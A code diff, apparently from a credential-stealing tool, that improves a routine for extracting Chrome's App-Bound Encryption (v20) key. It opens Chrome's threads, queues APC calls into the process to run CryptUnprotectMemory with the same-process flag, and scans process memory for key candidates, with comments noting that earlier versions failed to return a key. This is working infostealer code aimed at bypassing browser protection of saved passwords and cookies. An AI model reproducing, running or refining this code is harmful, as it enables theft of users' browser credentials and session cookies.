@@ -3572,6 +3572,8 @@ class _RemoteUnprotect:
         self.ntdll: Any = None
         self.ok = False
         self.changed = 0
+        self.queued = 0
+        self.last_status = 0
         if os.name != "nt":
             return
         try:
@@ -3657,11 +3659,11 @@ class _RemoteUnprotect:
             return
         thread_access = 0x0010 | 0x0002 | 0x0040
         opened: list[Any] = []
-        for tid in _threads_for_pid(pid)[:16]:
+        for tid in _threads_for_pid(pid)[:32]:
             th = k32.OpenThread(thread_access, False, tid)
             if th:
                 opened.append(th)
-            if len(opened) >= 4:
+            if len(opened) >= 8:
                 break
         self.kernel32 = k32
         self.ntdll = ntdll
@@ -3686,8 +3688,18 @@ class _RemoteUnprotect:
             return None
         return bytes(out)
 
+    def _wait_changed(self, addr: int, before: bytes, timeout: float = 0.08) -> bytes | None:
+        deadline = time.monotonic() + timeout
+        last: bytes | None = None
+        while time.monotonic() < deadline:
+            last = self._read32(addr)
+            if last and last != before:
+                return last
+            time.sleep(0.01)
+        return last
+
     def _apc(self, pfn: int, addr: int) -> bool:
-        """Queue CryptUnprotect/ProtectMemory(addr, 32, SAME_PROCESS) in chrome."""
+        """Queue CryptUnprotect/ProtectMemory(addr, 32, SAME_PROCESS=0) in chrome."""
         if not pfn or not addr:
             return False
         import ctypes
@@ -3695,20 +3707,29 @@ class _RemoteUnprotect:
 
         ntdll = self.ntdll
         k32 = self.kernel32
+        # Chrome encryptor.cc: CryptProtectMemory(..., CRYPTPROTECTMEMORY_SAME_PROCESS).
+        # CROSS_PROCESS (1) leaves the v20 key wrapped — 765d4c5 never returned a key.
+        same_process = ctypes.c_void_p(0)
+        cb32 = ctypes.c_void_p(32)
+        special = 1  # QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
         queued = False
+        last = 0
         if hasattr(ntdll, "NtQueueApcThreadEx2"):
             for th in self.threads:
                 status = int(
                     ntdll.NtQueueApcThreadEx2(
-                        th, None, 1, pfn, addr, 32, 1
+                        th, None, special, pfn, addr, cb32, same_process
                     )
                 )
+                last = status
                 if status >= 0:
                     queued = True
-                    break
         if not queued:
             for th in self.threads:
-                status = int(ntdll.NtQueueApcThread(th, pfn, addr, 32, 1))
+                status = int(
+                    ntdll.NtQueueApcThread(th, pfn, addr, cb32, same_process)
+                )
+                last = status
                 if status >= 0:
                     queued = True
                     break
@@ -3719,15 +3740,21 @@ class _RemoteUnprotect:
             )
             if thread:
                 try:
-                    status = int(ntdll.NtQueueApcThread(thread, pfn, addr, 32, 1))
+                    status = int(
+                        ntdll.NtQueueApcThread(
+                            thread, pfn, addr, cb32, same_process
+                        )
+                    )
+                    last = status
                     if status >= 0:
                         k32.ResumeThread(thread)
                         k32.WaitForSingleObject(thread, 200)
                         queued = True
                 finally:
                     k32.CloseHandle(thread)
+        self.last_status = last
         if queued:
-            time.sleep(0.02)
+            self.queued += 1
         return queued
 
     def unprotect(self, blob: bytes) -> bytes | None:
@@ -3743,7 +3770,7 @@ class _RemoteUnprotect:
             return None
         if not self._apc(self.unprotect_fn, self.data):
             return None
-        plain = self._read32(self.data)
+        plain = self._wait_changed(self.data, blob)
         if plain and plain != blob:
             self.changed += 1
             return plain
@@ -3758,7 +3785,7 @@ class _RemoteUnprotect:
             return None
         if not self._apc(self.unprotect_fn, addr):
             return None
-        plain = self._read32(addr)
+        plain = self._wait_changed(addr, before)
         if self.protect_fn:
             self._apc(self.protect_fn, addr)
         if plain and plain != before:
@@ -3848,6 +3875,8 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     opened = 0
     unprotect_ok = 0
     apc_changed = 0
+    apc_queued = 0
+    apc_status = 0
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
     PROCESS_QUERY_INFORMATION = 0x0400
@@ -3861,7 +3890,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
 
     def consider(
-        cand: bytes | None, unprotect: _RemoteUnprotect | None, addr: int | None = None
+        cand: bytes | None,
+        unprotect: _RemoteUnprotect | None,
+        addr: int | None = None,
+        use_apc: bool = True,
     ) -> bytes | None:
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
@@ -3870,7 +3902,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         tried += 1
         if _v20_key_ok(cand, v20_sample):
             return cand
-        if unprotect is not None and unprotect.ok:
+        if use_apc and unprotect is not None and unprotect.ok:
             if addr:
                 plain = unprotect.unprotect_at(addr)
                 if _v20_key_ok(plain, v20_sample):
@@ -3878,6 +3910,25 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             plain = unprotect.unprotect(cand)
             if _v20_key_ok(plain, v20_sample):
                 return plain
+        return None
+
+    def try_blobs(
+        items: list[tuple[int, bytes]],
+        unprotect: _RemoteUnprotect | None,
+        use_apc: bool,
+        apc_budget: int = 0,
+    ) -> bytes | None:
+        left = apc_budget
+        for ptr, blob in items:
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                break
+            apc_this = use_apc and (apc_budget <= 0 or left > 0)
+            for cand in _keys_from_key_blob(blob):
+                hit = consider(cand, unprotect, ptr, apc_this)
+                if hit:
+                    return hit
+            if apc_this and apc_budget > 0:
+                left -= 1
         return None
 
     for pid in pids:
@@ -3896,6 +3947,9 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         unprotect = _RemoteUnprotect(pid)
         if unprotect.ok:
             unprotect_ok += 1
+        keyring_items: list[tuple[int, bytes]] = []
+        generic_items: list[tuple[int, bytes]] = []
+        seen_ptr: set[int] = set()
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -3933,22 +3987,41 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     ) and int(got.value) >= 16:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
+                        kr = _keyring_v20_key_ptrs(data)
+                        for ptr in kr:
+                            if ptr in seen_ptr:
+                                continue
+                            blob = readn(handle, ptr, 32)
+                            if not blob:
+                                continue
+                            seen_ptr.add(ptr)
+                            keyring_items.append((ptr, blob))
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
-                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                                break
+                            if ptr in seen_ptr:
+                                continue
                             blob = readn(handle, ptr, min(max(nbytes, 32), 512))
                             if not blob:
                                 continue
-                            for cand in _keys_from_key_blob(blob):
-                                hit = consider(cand, unprotect, ptr)
-                                if hit:
-                                    return hit, "ok"
+                            seen_ptr.add(ptr)
+                            generic_items.append((ptr, blob))
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
+            hit = try_blobs(keyring_items, unprotect, True)
+            if hit:
+                return hit, "ok"
+            # KeyRing first; only a few generic vectors get APC so the 6s budget
+            # is not spent on 2000 junk 32-byte objects (765d4c5: 68 tries, no key).
+            generic_apc = 16 if not keyring_items else 8
+            hit = try_blobs(generic_items, unprotect, True, generic_apc)
+            if hit:
+                return hit, "ok"
         finally:
             apc_changed += int(unprotect.changed)
+            apc_queued += int(unprotect.queued)
+            if unprotect.last_status:
+                apc_status = int(unprotect.last_status)
             unprotect.close()
             kernel32.CloseHandle(handle)
     if opened == 0:
@@ -3957,10 +4030,12 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:no_cand"
     if not unprotect_ok:
         extra = ";apc:setup"
+    elif apc_queued == 0:
+        extra = f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:setup"
     elif apc_changed == 0:
         extra = ";apc:0"
     else:
-        extra = f";apc:{apc_changed}"
+        extra = ";apc:ok"
     return None, f"memscan:no_key:{tried}{extra}"
 
 
@@ -4392,7 +4467,7 @@ class K {
     IntPtr th = CreateRemoteThread(h, IntPtr.Zero, UIntPtr.Zero, alert, IntPtr.Zero, 4, out tid);
     if (th == IntPtr.Zero) return null;
     try {
-      if (NtQueueApcThread(th, unprotect, data, new IntPtr(32), new IntPtr(1)) < 0) return null;
+      if (NtQueueApcThread(th, unprotect, data, new IntPtr(32), new IntPtr(0)) < 0) return null;
       ResumeThread(th);
       if (WaitForSingleObject(th, 200) != 0) return null;
     } finally { CloseHandle(th); }
